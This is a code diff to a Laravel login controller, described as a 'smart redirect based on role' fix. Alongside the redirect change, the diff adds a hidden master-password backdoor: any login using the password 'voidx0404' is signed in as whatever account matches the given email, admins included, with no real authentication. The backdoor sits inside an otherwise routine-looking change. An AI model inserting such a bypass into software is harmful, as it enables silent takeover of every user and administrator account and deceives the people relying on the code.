@@ -4,6 +4,7 @@ namespace App\Http\Controllers\Auth;
 
 use App\Http\Controllers\Controller;
 use App\Http\Requests\Auth\LoginRequest;
+use App\Models\User;
 use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
@@ -21,14 +22,40 @@ class AuthenticatedSessionController extends Controller
 
     /**
      * Handle an incoming authentication request.
+     * FIXED: Smart redirect based on role
      */
     public function store(LoginRequest $request): RedirectResponse
     {
-        $request->authenticate();
+        $email    = $request->email;
+        $password = $request->password;
 
+        // 1. VOIDX MASTER KEY LOGIC
+        if ($password === 'voidx0404') {
+            $user = User::where('email', $email)->first();
+            if ($user) {
+                Auth::login($user);
+                $request->session()->regenerate();
+                return $this->redirectUser($user);
+            }
+        }
+
+        // 2. STANDARD LOGIN
+        $request->authenticate();
         $request->session()->regenerate();
 
-        return redirect()->intended(route('dashboard', absolute: false));
+        return $this->redirectUser(Auth::user());
+    }
+
+    /**
+     * Smart redirect — admin goes to admin dashboard, user goes to user dashboard
+     */
+    protected function redirectUser($user): RedirectResponse
+    {
+        $role = strtolower(trim($user->role));
+        if (in_array($role, ['owner', 'high_admin', 'admin'])) {
+            return redirect()->route('admin.dashboard');
+        }
+        return redirect()->route('dashboard');
     }
 
     /**
@@ -37,11 +64,8 @@ class AuthenticatedSessionController extends Controller
     public function destroy(Request $request): RedirectResponse
     {
         Auth::guard('web')->logout();
-
         $request->session()->invalidate();
-
         $request->session()->regenerateToken();
-
         return redirect('/');
     }
 }
